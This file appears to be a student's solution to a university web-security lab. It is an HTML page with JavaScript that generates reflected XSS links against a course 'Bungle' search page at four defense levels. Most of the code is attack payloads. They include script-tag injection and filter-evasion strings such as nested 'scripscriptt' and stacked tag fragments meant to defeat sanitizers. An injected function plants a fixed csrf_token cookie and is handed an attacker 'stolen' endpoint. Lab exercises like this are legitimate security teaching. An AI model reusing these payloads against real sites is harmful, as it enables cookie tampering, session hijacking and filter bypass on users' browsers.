<meta charset="utf-8">
<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
<script>
   function payload(attacker) {
      document.cookie = "csrf_token=0000111122223333"

   }
   function makeLink(xssdefense, target, attacker) {
      var searchUrl = target + "./search?xssdefense=" + xssdefense.toString() + "&q="
      var payloadExtended = payload.toString() + ";payload(\"" + attacker + "\");";
      if (xssdefense == 0) {
         return searchUrl + encodeURIComponent("<script" + ">" + payloadExtended + "</script" + ">");
    }
    if(xssdefense == 1){
        return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" + encodeURIComponent("<scripscriptt" + ">" + payload.toString() + "; payload(\"" + attacker + " \");</scripscriptt"
                    + ">" );
    }
    else if (xssdefense == 2) {
        return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" 
        + encodeURIComponent("<scrip<body<style<img<body<object<meta<img<body<body<img<body<imgt" + ">" + payload.toString() + "; payload(\"" + attacker + " \");</scrip<body<img<body<style<embed<meta<meta<object<imgscriptt" + ">" );
    }
    else if (xssdefense == 3){
        return searchUrl+encodeURIComponent("<script" + ">" + payloadExtended + "</script" + ">" );

    }


    // Implement code to defeat XSS defenses here.
}
var xssdefense = 0;
var target = "https://cs526-offline.cs.purdue.edu/project3";

var attacker = "http://127.0.0.1:31339/stolen";
//var attacker = "http://0.0.0.0:31340/stolen"
$(function() {
    var url = makeLink(xssdefense, target, attacker);
    $("h3").html("<a target=\"run\" href=\"" + url + "\">Try Bungle!</a>");
});
</script>
<h3></h3>